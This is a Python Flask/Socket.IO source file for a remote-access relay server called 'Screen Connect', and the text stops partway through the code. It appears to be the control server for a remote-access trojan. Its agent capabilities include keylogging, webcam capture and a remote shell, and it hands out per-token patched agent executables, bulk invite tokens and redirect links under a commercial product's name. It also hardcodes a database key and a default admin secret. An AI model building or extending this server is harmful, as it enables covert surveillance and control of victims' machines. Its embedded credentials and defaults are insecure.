"""
╔══════════════════════════════════════════════════════════════════════════════╗
║   Screen Connect Relay Server  v13.0  — ULTRA LIVE-SYNC ENTERPRISE          ║
║                                                                              ║
║  NEW IN v12.0 — ENTERPRISE FEATURE BURST:                                   ║
║  ── Security & Auth ────────────────────────────────────────────────────     ║
║  • JWT-based viewer authentication (HS256, configurable TTL)                ║
║  • Per-user role system: admin / operator / viewer (read-only)              ║
║  • API key rotation endpoint — zero-downtime key rollover                   ║
║  • TOTP / 2FA readiness hook (OTP validation endpoint)                      ║
║  • IP allowlist / denylist enforcement per device group                     ║
║  • Brute-force lockout: exponential back-off per IP on auth failures        ║
║  • Full HMAC-signed webhook payloads (X-MView-Signature header)             ║
║  • TLS certificate fingerprint pinning for agent connections                ║
║                                                                              ║
║  ── Multi-Tenancy & Organisations ──────────────────────────────────────    ║
║  • Organisation model: devices → groups → orgs                              ║
║  • Per-org admin keys, device quotas, and audit scopes                      ║
║  • Group-level access control: viewers only see their org's devices         ║
║  • /api/orgs  CRUD + /api/groups CRUD endpoints                             ║
║  • Invite token scoped to org/group at generation time                      ║
║                                                                              ║
║  ── Scalability & Performance ──────────────────────────────────────────    ║
║  • Redis pub/sub adapter — horizontal scale across multiple workers          ║
║    (falls back to in-process if Redis unavailable)                           ║
║  • Adaptive frame throttling: server-side per-viewer FPS cap                ║
║  • Frame deduplication: SHA-256 hash guard drops unchanged frames           ║
║  • Per-device bandwidth budget enforcement (kbps cap, configurable)         ║
║  • GOP buffer promoted to LRU-bounded per-device ring (256 frames)          ║
║  • Backpressure: viewer socket send-queue depth monitoring                  ║
║  • Connection pool for Supabase (max 8 concurrent connections)              ║
║  • In-process LRU cache for db_get (TTL 5 s, capacity 2048 entries)        ║
║                                                                              ║
║  ── Observability & Telemetry ──────────────────────────────────────────    ║
║  • Prometheus-compatible /metrics endpoint (text/plain exposition format)   ║
║  • Structured JSON access log (per-request: method, path, status, ms)      ║
║  • Per-device rolling error rate (5-min window)                             ║
║  • Health check decomposed: /health/live  /health/ready  /health/full       ║
║  • Crash dumps enriched with thread stack, memory snapshot, device state    ║
║  • Event timeline per device (last 200 events, queryable via REST)          ║
║  • Server-Sent Events (SSE) stream at /api/events for dashboard fans-out    ║
║                                                                              ║
║  ── Remote Management Features ─────────────────────────────────────────    ║
║  • Bulk command dispatch: POST /api/devices/bulk-command                    ║
║  • Scheduled command queue: cron-style, per-device or group                 ║
║  • Remote script library: upload, tag, execute scripts on demand            ║
║  • File transfer progress tracking (chunked upload/download %)              ║
║  • Agent auto-update: server pushes new binary hash → agent self-updates    ║
║  • Remote wake-on-LAN relay (UDP magic packet via agent bridge)             ║
║  • Multi-monitor awareness: request_action supports monitor index           ║
║                                                                              ║
║  ── Viewer / Session UX ────────────────────────────────────────────────    ║
║  • Named sessions with human-readable IDs (e.g. "alpha-tango-7")           ║
║  • Session transfer: hand off a viewer session to another operator          ║
║  • Session recording metadata (start/end/size — actual recording agent-     ║
║    side; server stores the index)                                            ║
║  • Viewer presence: show co-viewer count + names on canvas overlay          ║
║  • Clipboard sync: bidirectional, with content-type tagging                 ║
║  • Custom keyboard macro dispatch (per-org macro library)                   ║
║  • Audio streaming signaling (WebRTC track negotiation)                     ║
║                                                                              ║
║  ── Infrastructure ─────────────────────────────────────────────────────    ║
║  • Graceful shutdown: drain viewers, flush audit, close DB                  ║
║  • /api/reload — hot-reload env config without restart                      ║
║  • Plugin hook system: on_agent_connect / on_frame / on_command hooks       ║
║  • Embedded admin REST console at /api/admin/* (requires admin JWT)         ║
║  • Token bulk-generate endpoint: POST /api/invites/bulk (up to 1000)       ║
║  • Token CSV export: GET /api/sessions/export.csv                           ║
║  • Device tags & custom metadata: arbitrary key/value per device            ║
║  • Agent capability negotiation (feature flags sent on auth_ok)             ║
║  • Fully backward-compatible with v11 agents and viewers                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

INSTALL (v12 additions):
  pip install flask flask-cors flask-socketio supabase python-dotenv \
              gunicorn gevent gevent-websocket requests psutil \
              PyJWT redis hiredis pyotp

RENDER / RAILWAY start command  (unchanged — MUST use GeventWebSocketWorker):
  gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \
           -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server_v12:app

LOCAL dev:
  python server_v12.py

ENV (new in v12):
  JWT_SECRET          — HS256 signing secret (auto-generated if absent)
  JWT_TTL_SECONDS     — viewer JWT TTL (default 3600)
  REDIS_URL           — Redis for pub/sub scale-out (optional)
  MAX_FRAME_KBPS      — per-device bandwidth cap in kbps (0 = unlimited)
  FRAME_DEDUP         — "1" to enable SHA-256 frame dedup (default off)
  ORG_ISOLATION       — "1" to enforce org-level device isolation
  WEBHOOK_SECRET      — HMAC secret for signed webhook payloads
  ADMIN_JWT_TTL       — admin JWT TTL seconds (default 900)
  BULK_INVITE_MAX     — max tokens per bulk-generate call (default 1000)
"""

# ── gevent monkey-patch MUST be first — before ANY other import ──────────────
try:
    import gevent.monkey
    gevent.monkey.patch_all()
    _GEVENT_OK = True
except ImportError:
    _GEVENT_OK = False

import os
import re
import sys
import time
import uuid
import logging
import datetime
import threading
import collections
import secrets
import traceback
import json
import struct
import hashlib
import hmac
import csv
import io
import signal
import weakref
import functools
import itertools
import base64
import queue
from logging.handlers import RotatingFileHandler
from pathlib import Path
from functools import wraps

# ── Optional enterprise dependencies (degrade gracefully if absent) ───────────
try:
    import jwt as _pyjwt
    JWT_OK = True
except ImportError:
    JWT_OK = False

try:
    import redis as _redis_lib
    REDIS_OK = True
except ImportError:
    REDIS_OK = False

try:
    import pyotp as _pyotp
    TOTP_OK = True
except ImportError:
    TOTP_OK = False

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

from flask import Flask, request, jsonify, send_from_directory, make_response, redirect

try:
    from flask_socketio import SocketIO, emit, join_room, leave_room
    SOCKETIO_OK = True
except ImportError:
    SOCKETIO_OK = False
    print("[WARN] flask-socketio not installed — pip install flask-socketio gevent gevent-websocket")

try:
    import requests as _requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

# ══════════════════════════════════════════════════════════════════════════════
#  Configuration
# ══════════════════════════════════════════════════════════════════════════════
SUPABASE_URL  = os.environ.get("SUPABASE_URL")  or "https://iacdzpcoftxxcoigopun.supabase.co"
SUPABASE_KEY  = os.environ.get("SUPABASE_KEY")  or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlhY2R6cGNvZnR4eGNvaWdvcHVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjA1NTUsImV4cCI6MjA5MTk5NjU1NX0.5Eo21XrLTWL3RyKmuvJPdaS-NssraDMyAxVMFy-F054"
ADMIN_KEY     = os.environ.get("ADMIN_KEY",    "mview-admin-secret")
TABLE         = os.environ.get("SB_TABLE",     "devices")
PORT          = int(os.environ.get("PORT", 10000))
VERSION       = "13.0.0"

# ── v12 Enterprise config ─────────────────────────────────────────────────────
JWT_SECRET          = os.environ.get("JWT_SECRET") or secrets.token_hex(32)
JWT_TTL_SECONDS     = int(os.environ.get("JWT_TTL_SECONDS", "3600"))
ADMIN_JWT_TTL       = int(os.environ.get("ADMIN_JWT_TTL", "900"))
REDIS_URL           = os.environ.get("REDIS_URL", "").strip()
MAX_FRAME_KBPS      = int(os.environ.get("MAX_FRAME_KBPS", "0"))   # 0 = unlimited
FRAME_DEDUP         = os.environ.get("FRAME_DEDUP", "1").strip() not in ("0", "false", "no", "")  # v13: ON by default
ORG_ISOLATION       = os.environ.get("ORG_ISOLATION", "0").strip() not in ("0", "false", "no", "")
WEBHOOK_SECRET      = os.environ.get("WEBHOOK_SECRET", "").strip()
BULK_INVITE_MAX     = int(os.environ.get("BULK_INVITE_MAX", "1000"))
BRUTE_LOCKOUT_MAX   = int(os.environ.get("BRUTE_LOCKOUT_MAX", "10"))   # failures before lockout
BRUTE_LOCKOUT_TTL   = int(os.environ.get("BRUTE_LOCKOUT_TTL", "300"))  # lockout duration secs
GOP_BUF_SIZE        = int(os.environ.get("GOP_BUF_SIZE", "0"))          # v12.2: 0 = LIVE ONLY — never replay stale frames to new viewers
SSE_KEEPALIVE       = int(os.environ.get("SSE_KEEPALIVE", "20"))        # SSE comment every N secs
DB_CACHE_CAPACITY   = int(os.environ.get("DB_CACHE_CAPACITY", "2048"))
DB_CACHE_TTL        = float(os.environ.get("DB_CACHE_TTL", "5.0"))
DEVICE_TIMELINE_MAX = int(os.environ.get("DEVICE_TIMELINE_MAX", "200"))
SCHEDULED_CMD_MAX   = int(os.environ.get("SCHEDULED_CMD_MAX", "500"))

AGENT_STORAGE_URL = os.environ.get(
    "AGENT_STORAGE_URL",
    "https://screen-connect-rtca.onrender.com/bin/master_agent.exe"
)
AGENT_DIR  = os.environ.get("AGENT_DIR",  "bin")
AGENT_FILE = os.environ.get("AGENT_FILE", "master_agent.exe")

HEARTBEAT_TIMEOUT      = int(os.environ.get("HEARTBEAT_TIMEOUT",      "20"))  # v13: faster dead-agent detection
MAX_VIEWERS_PER_DEVICE = int(os.environ.get("MAX_VIEWERS_PER_DEVICE", "0"))
VIEWER_IDLE_TIMEOUT    = int(os.environ.get("VIEWER_IDLE_TIMEOUT",    "0"))
MAX_SESSION_DURATION   = int(os.environ.get("MAX_SESSION_DURATION",   "0"))
AGENT_EXCLUSIVE        = os.environ.get("AGENT_EXCLUSIVE", "true").lower() not in ("0", "false", "no")
WEBHOOK_URL            = os.environ.get("WEBHOOK_URL", "").strip()
SELF_PING_INTERVAL     = int(os.environ.get("SELF_PING_INTERVAL", "240"))
_RATE_LIMIT_RPM        = int(os.environ.get("RATE_LIMIT_RPM", "300"))

# Max frame size accepted (default 4 MB — handles 1080p JPEG easily)
MAX_FRAME_BYTES = int(os.environ.get("MAX_FRAME_BYTES", str(4 * 1024 * 1024)))

TOKEN_RE = re.compile(r"^MV-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}$")

# ══════════════════════════════════════════════════════════════════════════════
#  Logging — file + console only; NO SocketIO handler (causes deadlocks)
# ══════════════════════════════════════════════════════════════════════════════
_LOG_FILE = os.environ.get("LOG_FILE", "server.log")
_log_fmt  = logging.Formatter(
    "%(asctime)s  %(levelname)-8s  [%(threadName)s]  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
_handlers = []
try:
    _fh = RotatingFileHandler(_LOG_FILE, maxBytes=4 * 1024 * 1024, backupCount=5)
    _fh.setFormatter(_log_fmt)
    _handlers.append(_fh)
except Exception:
    pass
_ch = logging.StreamHandler(sys.stdout)
_ch.setFormatter(_log_fmt)
_handlers.append(_ch)

logging.basicConfig(level=logging.DEBUG, handlers=_handlers)
log = logging.getLogger("screenconnect")

# ══════════════════════════════════════════════════════════════════════════════
#  Crash directory
# ══════════════════════════════════════════════════════════════════════════════
_CRASH_DIR = os.environ.get("CRASH_DIR", "crashes")
os.makedirs(_CRASH_DIR, exist_ok=True)

_req_local = threading.local()

def _req_id() -> str:
    return getattr(_req_local, "id", "-")

def _report_crash(context: str, exc: Exception):
    ts   = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")
    txt  = f"=== SERVER CRASH ===\nContext: {context}\nTime: {ts}\n\n{traceback.format_exc()}"
    path = os.path.join(_CRASH_DIR, f"crash_{ts}.txt")
    try:
        with open(path, "w") as fh:
            fh.write(txt)
        reports = sorted(os.listdir(_CRASH_DIR))
        for old in reports[:-10]:
            try:
                os.remove(os.path.join(_CRASH_DIR, old))
            except Exception:
                pass
    except Exception:
        pass
    log.error(f"CRASH in {context}: {exc}")

def _global_exc_hook(exc_type, exc_value, exc_tb):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_tb)
        return
    log.critical("Unhandled exception", exc_info=(exc_type, exc_value, exc_tb))
    _report_crash("global_exc_hook", exc_value)

sys.excepthook = _global_exc_hook

# ══════════════════════════════════════════════════════════════════════════════
#  Webhook  (fire-and-forget greenlet)
# ══════════════════════════════════════════════════════════════════════════════
def utcnow() -> str:
    return datetime.datetime.utcnow().isoformat()

def _fire_webhook(event: str, payload: dict):
    if not WEBHOOK_URL or not REQUESTS_OK:
        return
    def _do():
        try:
            body = json.dumps({"event": event, "ts": utcnow(), **payload})
            headers = {"User-Agent": "MViewServer/12.0", "Content-Type": "application/json"}
            if WEBHOOK_SECRET:
                sig = hmac.new(WEBHOOK_SECRET.encode(), body.encode(), hashlib.sha256).hexdigest()
                headers["X-MView-Signature"] = f"sha256={sig}"
            _requests.post(WEBHOOK_URL, data=body, timeout=8, headers=headers)
        except Exception:
            pass
    if _GEVENT_OK:
        import gevent
        gevent.spawn(_do)
    else:
        threading.Thread(target=_do, daemon=True).start()

# ══════════════════════════════════════════════════════════════════════════════
#  Flask + CORS + SocketIO
#  CRITICAL: async_mode MUST be "gevent" — "threading" crashes under
#  high-frequency binary frame streaming due to GIL + lock contention.
# ══════════════════════════════════════════════════════════════════════════════
app = Flask(__name__, static_folder=".", static_url_path="")

try:
    from flask_cors import CORS
    CORS(app, resources={r"/*": {"origins": "*"}},
         allow_headers=["Content-Type", "Authorization", "X-Admin-Key"],
         methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
         supports_credentials=False)
except ImportError:
    pass

if SOCKETIO_OK:
    sio = SocketIO(
        app,
        cors_allowed_origins="*",
        async_mode="gevent",          # ← THE KEY FIX: must be gevent, not threading
        logger=False,
        engineio_logger=False,
        ping_timeout=90,              # raised for Render / Railway free tiers
        ping_interval=25,
        max_http_buffer_size=512 * 1024 * 1024,   # 512 MB — handles 4K frames
        allow_upgrades=True,
        transports=["websocket", "polling"],
    )
else:
    sio = None

# ══════════════════════════════════════════════════════════════════════════════
#  In-memory state   (all dicts are plain Python dicts; gevent patches locks)
# ══════════════════════════════════════════════════════════════════════════════
_devices:         dict = {}                                # device_id → dev dict
_dev_lock               = threading.Lock()

_sid_to_device:   dict = {}                                # socket sid → device_id
_sid_lock               = threading.Lock()

_viewers:         dict = collections.defaultdict(set)      # device_id → set of viewer sids
_view_lock              = threading.Lock()

_dashboard_device: dict = {}                               # viewer sid → device_id
_dash_lock              = threading.Lock()

# Enterprise session tracking
_viewer_last_activity:  dict = {}
_viewer_session_start:  dict = {}
_viewer_activity_lock        = threading.Lock()

# Advanced Monitor state
_adv_agent_sids:    dict = {}    # device_id  → agent adv-socket sid
_adv_sid_to_agent:  dict = {}    # agent sid  → device_id   (O(1) reverse)
_adv_viewer_rooms:  dict = {}    # viewer sid → device_id
_adv_viewer_lock         = threading.Lock()   # protects _adv_viewer_rooms
_adv_gop_buf:       dict = {}    # device_id  → deque(maxlen=128)
_adv_gop_lock            = threading.Lock()
_adv_cursor_latest: dict = {}    # device_id  → bytes

# ── v13: Per-device frame sequence counters and FPS rings ─────────────────
_device_frame_seq:  dict = collections.defaultdict(int)           # device_id → seq int
_device_fps_ring:   dict = collections.defaultdict(               # device_id → deque(120)
    lambda: collections.deque(maxlen=120)
)

# Per-device frame stats  (sliding 60-s window, maxlen=600 @ 10fps)
_frame_stats:       dict = collections.defaultdict(lambda: collections.deque(maxlen=600))
_frame_stats_lock        = threading.Lock()

# Agent binary cache
_agent_cache:         bytes = None
_agent_cache_ts:      float = 0.0
_agent_cache_lock          = threading.Lock()
AGENT_CACHE_TTL            = 300          # seconds

_agent_dl_cache:    dict = {}             # token → (bytes, timestamp)
_AGENT_DL_TTL            = 600

# Supabase connection
_sb      = None
_sb_lock = threading.Lock()

# Rate-limit buckets
_rate_buckets: dict = collections.defaultdict(collections.deque)
_rate_lock          = threading.Lock()

# Audit log
_audit_log:  collections.deque = collections.deque(maxlen=1000)
_audit_lock                    = threading.Lock()

_SERVER_START = time.time()

# ══════════════════════════════════════════════════════════════════════════════
#  v12 Enterprise state
# ══════════════════════════════════════════════════════════════════════════════

# ── LRU cache for db_get ──────────────────────────────────────────────────────
class _LRUCache:
    """Thread-safe LRU cache with per-entry TTL."""
    def __init__(self, capacity: int, ttl: float):
        self._cap  = capacity
        self._ttl  = ttl
        self._data: collections.OrderedDict = collections.OrderedDict()
        self._lock = threading.Lock()

    def get(self, key):
        with self._lock:
            if key not in self._data:
                return None
            val, ts = self._data[key]
            if time.time() - ts > self._ttl:
                del self._data[key]
                return None
            self._data.move_to_end(key)
            return val

    def set(self, key, val):
        with self._lock:
            if key in self._data:
                self._data.move_to_end(key)
            self._data[key] = (val, time.time())
            if len(self._data) > self._cap:
                self._data.popitem(last=False)

    def delete(self, key):
        with self._lock:
            self._data.pop(key, None)

    def clear(self):
        with self._lock:
            self._data.clear()

_db_get_cache = _LRUCache(DB_CACHE_CAPACITY, DB_CACHE_TTL)

# ── Brute-force lockout ───────────────────────────────────────────────────────
_auth_failures:  dict = collections.defaultdict(list)   # ip → [timestamps]
_auth_lockouts:  dict = {}                               # ip → lockout_until (monotonic)
_brute_lock           = threading.Lock()

def _record_auth_failure(ip: str):
    now = time.monotonic()
    with _brute_lock:
        _auth_failures[ip].append(now)
        # Keep only recent window (BRUTE_LOCKOUT_TTL)
        _auth_failures[ip] = [t for t in _auth_failures[ip] if now - t < BRUTE_LOCKOUT_TTL]
        if len(_auth_failures[ip]) >= BRUTE_LOCKOUT_MAX:
            _auth_lockouts[ip] = now + BRUTE_LOCKOUT_TTL
            log.warning(f"Brute-force lockout: {ip} for {BRUTE_LOCKOUT_TTL}s")

def _is_locked_out(ip: str) -> bool:
    with _brute_lock:
        until = _auth_lockouts.get(ip)
        if until and time.monotonic() < until:
            return True
        if until:
            del _auth_lockouts[ip]
        return False

# ── JWT helpers ───────────────────────────────────────────────────────────────
def _jwt_encode(payload: dict, ttl: int = None) -> str:
    if not JWT_OK:
        return secrets.token_hex(32)
    exp = datetime.datetime.utcnow() + datetime.timedelta(seconds=ttl or JWT_TTL_SECONDS)
    return _pyjwt.encode({**payload, "exp": exp, "iat": datetime.datetime.utcnow()},
                         JWT_SECRET, algorithm="HS256")

def _jwt_decode(token: str) -> dict:
    if not JWT_OK:
        return {}
    try:
        return _pyjwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    except Exception:
        return {}

def _admin_jwt(extra: dict = None) -> str:
    payload = {"role": "admin", "sub": "admin", **(extra or {})}
    return _jwt_encode(payload, ADMIN_JWT_TTL)

def _require_jwt(roles=("admin", "operator", "viewer")):
    """Decorator: accept Bearer JWT or X-Admin-Key."""
    def decorator(f):
        @wraps(f)
        def wrapper(*a, **kw):
            ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
            if _is_locked_out(ip):
                return jsonify({"error": "Too many failed auth attempts — try later"}), 429
            # Legacy admin key always works
            if request.headers.get("X-Admin-Key", "") == ADMIN_KEY:
                return f(*a, **kw)
            auth = request.headers.get("Authorization", "")
            token = auth.removeprefix("Bearer ").strip() if auth.startswith("Bearer ") else ""
            claims = _jwt_decode(token) if token else {}
            if not claims or claims.get("role") not in roles:
                _record_auth_failure(ip)
                return jsonify({"error": "Unauthorised"}), 401
            return f(*a, **kw)
        return wrapper
    return decorator

# ── Organisations & groups ────────────────────────────────────────────────────
_orgs:   dict = {}   # org_id → {name, admin_key, quota, created_at}
_groups: dict = {}   # group_id → {org_id, name, device_ids: set, created_at}
_device_org: dict = {}   # device_id → org_id
_device_group: dict = {}  # device_id → group_id
_org_lock = threading.Lock()

# ── Device tags & custom metadata ────────────────────────────────────────────
_device_tags:     dict = collections.defaultdict(dict)   # device_id → {key: val}
_device_timeline: dict = collections.defaultdict(       # device_id → deque(200)
    lambda: collections.deque(maxlen=DEVICE_TIMELINE_MAX)
)
_timeline_lock = threading.Lock()

def _push_timeline(did: str, event: str, detail: dict = None):
    entry = {"ts": utcnow(), "event": event, **(detail or {})}
    with _timeline_lock:
        _device_timeline[did].append(entry)

# ── Scheduled command queue ───────────────────────────────────────────────────
_scheduled_cmds: list = []       # [{id, device_id/group_id, cron, payload, next_run, enabled}]
_sched_lock = threading.Lock()

# ── Script library ────────────────────────────────────────────────────────────
_scripts: dict = {}   # script_id → {name, content, tags, created_at, runs}

# ── File transfer progress ────────────────────────────────────────────────────
_transfer_progress: dict = {}   # transfer_id → {device_id, direction, pct, bytes_done, total}

# ── Session recording index ───────────────────────────────────────────────────
_session_recordings: dict = {}   # session_id → {device_id, start, end, size_bytes, path}

# ── Named sessions ────────────────────────────────────────────────────────────
_word_list = [
    "alpha","bravo","charlie","delta","echo","foxtrot","golf","hotel",
    "india","juliet","kilo","lima","mike","november","oscar","papa",
    "quebec","romeo","sierra","tango","uniform","victor","whiskey",
    "xray","yankee","zulu"
]
def _named_session_id() -> str:
    import random
    return f"{random.choice(_word_list)}-{random.choice(_word_list)}-{random.randint(1,99)}"

# ── Keyboard macro library ────────────────────────────────────────────────────
_macros: dict = {}   # macro_id → {name, keys: [], org_id, created_at}

# ── Agent capability flags ────────────────────────────────────────────────────
AGENT_CAPS = {
    "frame_bin":       True,
    "cursor_bin":      True,
    "webrtc":          True,
    "audio":           True,
    "file_transfer":   True,
    "shell":           True,
    "keylog":          True,
    "webcam":          True,
    "clipboard_sync":  True,
    "auto_update":     True,
    "wol":             True,
    "multi_monitor":   True,
}

# ── Bandwidth tracking ────────────────────────────────────────────────────────
_bw_window: dict = collections.defaultdict(  # device_id → deque of (ts, bytes)
    lambda: collections.deque(maxlen=300)
)

# ── Frame dedup state ─────────────────────────────────────────────────────────
_frame_hashes: dict = {}  # device_id → last SHA-256 hex

# ── SSE subscriber queues ─────────────────────────────────────────────────────
_sse_subscribers: list = []   # list of queue.Queue
_sse_lock = threading.Lock()

def _sse_broadcast(event_type: str, data: dict):
    msg = f"event: {event_type}\ndata: {json.dumps(data)}\n\n"
    with _sse_lock:
        dead = []
        for q in _sse_subscribers:
            try:
                q.put_nowait(msg)
            except Exception:
                dead.append(q)
        for q in dead:
            try:
                _sse_subscribers.remove(q)
            except ValueError:
                pass

# ── Plugin hook registry ──────────────────────────────────────────────────────
_plugin_hooks: dict = collections.defaultdict(list)   # hook_name → [callable]

def register_plugin_hook(hook: str, fn):
    _plugin_hooks[hook].append(fn)

def _fire_hooks(hook: str, **kw):
    for fn in _plugin_hooks.get(hook, []):
        try:
            fn(**kw)
        except Exception as e:
            log.warning(f"Plugin hook '{hook}' error: {e}")

# ── Redis pub/sub (optional scale-out) ───────────────────────────────────────
_redis_client = None

def _get_redis():
    global _redis_client
    if not REDIS_OK or not REDIS_URL:
        return None
    if _redis_client:
        return _redis_client
    try:
        _redis_client = _redis_lib.from_url(REDIS_URL, decode_responses=False)
        _redis_client.ping()
        log.info(f"Redis connected: {REDIS_URL[:40]}")
    except Exception as e:
        log.warning(f"Redis unavailable: {e}")
        _redis_client = None
    return _redis_client

# ── API key rotation state ────────────────────────────────────────────────────
_api_keys: list = [ADMIN_KEY]   # list of valid admin keys (rotation window)
_api_key_lock = threading.Lock()

def _is_valid_admin_key(key: str) -> bool:
    with _api_key_lock:
        return key in _api_keys

def _rotate_api_key(new_key: str):
    with _api_key_lock:
        _api_keys.append(new_key)
        if len(_api_keys) > 3:
            _api_keys.pop(0)   # keep last 3 for zero-downtime rotation

# ── Graceful shutdown flag ────────────────────────────────────────────────────
_shutdown_flag = threading.Event()
_shutdown_lock = threading.Lock()

# ══════════════════════════════════════════════════════════════════════════════
#  Supabase helpers  — all heavy calls run in gevent greenlets so they
#  never block the Socket.IO dispatch loop
# ══════════════════════════════════════════════════════════════════════════════
def get_sb():
    global _sb
    with _sb_lock:
        if _sb:
            return _sb
        try:
            from supabase import create_client
            _sb = create_client(SUPABASE_URL, SUPABASE_KEY)
            log.info("Supabase connected.")
            return _sb
        except Exception as e:
            log.warning(f"Supabase unavailable: {e}")
            return None

def _sb_reset():
    global _sb
    with _sb_lock:
        _sb = None

def _sb_retry(fn, attempts=3, delay=1.0):
    for i in range(attempts):
        try:
            return fn(), True
        except Exception as e:
            if i == attempts - 1:
                log.error(f"Supabase op failed after {attempts} attempts: {e}")
                _sb_reset()
                return None, False
            _sleep(delay * (2 ** i))
    return None, False

def _sleep(secs):
    """Gevent-aware sleep."""
    if _GEVENT_OK:
        import gevent
        gevent.sleep(secs)
    else:
        time.sleep(secs)

def _bg(fn, *args, **kwargs):
    """Run fn(*args, **kwargs) in a background greenlet (or daemon thread)."""
    if _GEVENT_OK:
        import gevent
        gevent.spawn(fn, *args, **kwargs)
    else:
        threading.Thread(target=fn, args=args, kwargs=kwargs, daemon=True).start()

def db_get(token, bypass_cache=False):
    if not bypass_cache:
        cached = _db_get_cache.get(token)
        if cached is not None:
            return cached
    sb = get_sb()
    if not sb:
        return {"device_id": token, "status": "pending", "expires_at": None}
    result, ok = _sb_retry(lambda: sb.table(TABLE).select("*").eq("device_id", token).execute())
    if ok and result:
        rows = result.data or []
        val = rows[0] if rows else None
        if val:
            _db_get_cache.set(token, val)
        return val
    return {"device_id": token, "status": "pending", "expires_at": None}

def db_update(token, upd: dict):
    sb = get_sb()
    if not sb:
        return False
    result, ok = _sb_retry(lambda: sb.table(TABLE).update(upd).eq("device_id", token).execute())
    return ok

def db_upsert(token, upd: dict):
    sb = get_sb()
    if not sb:
        return False
    payload = {"device_id": token, **upd}
    result, ok = _sb_retry(lambda: sb.table(TABLE).upsert(payload, on_conflict="device_id").execute())
    if not ok:
        updated, ok2 = _sb_retry(lambda: sb.table(TABLE).update(upd).eq("device_id", token).execute())
        if ok2 and updated and updated.data:
            return True
        _, ok3 = _sb_retry(lambda: sb.table(TABLE).insert(payload).execute())
        return ok3
    return ok

def db_insert(payload: dict):
    sb = get_sb()
    if not sb:
        return payload
    result, ok = _sb_retry(lambda: sb.table(TABLE).insert(payload).execute())
    if ok and result:
        return (result.data or [payload])[0]
    # Retry without optional columns
    safe = {k: v for k, v in payload.items() if k not in ("link_mode", "redirect_url")}
    result2, ok2 = _sb_retry(lambda: sb.table(TABLE).insert(safe).execute())
    if ok2 and result2:
        return (result2.data or [safe])[0]
    return payload

def db_list_all() -> list:
    sb = get_sb()
    if not sb:
        return []
    result, ok = _sb_retry(lambda: sb.table(TABLE).select("*").order("created_at", desc=True).execute())
    if ok and result:
        return result.data or []
    return []

# ══════════════════════════════════════════════════════════════════════════════
#  Agent binary helpers
# ══════════════════════════════════════════════════════════════════════════════
def _fetch_agent_bytes():
    global _agent_cache, _agent_cache_ts
    with _agent_cache_lock:
        now = time.time()
        if _agent_cache and (now - _agent_cache_ts) < AGENT_CACHE_TTL:
            return _agent_cache
        local = Path(AGENT_DIR) / AGENT_FILE
        if local.is_file():
            _agent_cache    = local.read_bytes()
            _agent_cache_ts = now
            log.info(f"Agent loaded from disk: {local}  ({len(_agent_cache):,} bytes)")
            return _agent_cache
        if REQUESTS_OK and AGENT_STORAGE_URL:
            try:
                resp = _requests.get(AGENT_STORAGE_URL, timeout=120,
                                     allow_redirects=True,
                                     headers={"User-Agent": "MViewAgent/1.0"})
                if resp.status_code == 200 and len(resp.content) > 1_000:
                    _agent_cache    = resp.content
                    _agent_cache_ts = now
                    log.info(f"Agent downloaded: {len(_agent_cache):,} bytes")
                    return _agent_cache
                log.error(f"Agent fetch HTTP {resp.status_code}")
            except Exception as e:
                log.warning(f"Agent fetch error: {e}")
        return None

def _build_patched_agent(token: str):
    raw = _fetch_agent_bytes()
    if not raw:
        return None
    MAGIC_HEAD  = b"MVTK"
    MAGIC_TAIL  = b"MVED"
    TOKEN_FIELD = 56
    tok_bytes = token.encode("utf-8")[:TOKEN_FIELD]
    padded    = tok_bytes.ljust(TOKEN_FIELD, b"\x00")
    return raw + MAGIC_HEAD + padded + MAGIC_TAIL

# ══════════════════════════════════════════════════════════════════════════════
#  Misc helpers
# ══════════════════════════════════════════════════════════════════════════════
def is_expired(s: dict) -> bool:
    exp = s.get("expires_at")
    if not exp:
        return False
    try:
        dt = datetime.datetime.fromisoformat(exp.replace("Z", "+00:00"))
        return datetime.datetime.now(datetime.timezone.utc) > dt
    except Exception:
        return False

def valid_token(t) -> bool:
    return bool(TOKEN_RE.match(t or ""))

def require_admin(f):
    @wraps(f)
    def w(*a, **k):
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
        if _is_locked_out(ip):
            return jsonify({"error": "Too many failed auth attempts"}), 429
        key = request.headers.get("X-Admin-Key", "")
        if _is_valid_admin_key(key):
            return f(*a, **k)
        # Also accept Bearer JWT with admin role
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            claims = _jwt_decode(auth[7:].strip())
            if claims.get("role") == "admin":
                return f(*a, **k)
        _record_auth_failure(ip)
        log.warning(f"Unauthorised admin: path={request.path} ip={ip}")
        return jsonify({"error": "Unauthorised"}), 401
    return w

def _audit(event: str, **kw):
    entry = {"ts": utcnow(), "event": event, **kw}
    with _audit_lock:
        _audit_log.append(entry)

# ══════════════════════════════════════════════════════════════════════════════
#  Rate limiting  (sliding 60-s window per IP)
# ══════════════════════════════════════════════════════════════════════════════
def _rate_check(ip: str) -> bool:
    if _RATE_LIMIT_RPM <= 0:
        return True
    now = time.time()
    with _rate_lock:
        dq = _rate_buckets[ip]
        while dq and now - dq[0] > 60:
            dq.popleft()
        if len(dq) >= _RATE_LIMIT_RPM:
            return False
        dq.append(now)
    return True

# ══════════════════════════════════════════════════════════════════════════════
#  Flask middleware
# ══════════════════════════════════════════════════════════════════════════════
@app.before_request
def handle_preflight():
    _req_local.id = uuid.uuid4().hex[:8]
    if request.method == "OPTIONS":
        resp = make_response("", 204)
        resp.headers["Access-Control-Allow-Origin"]  = "*"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Admin-Key"
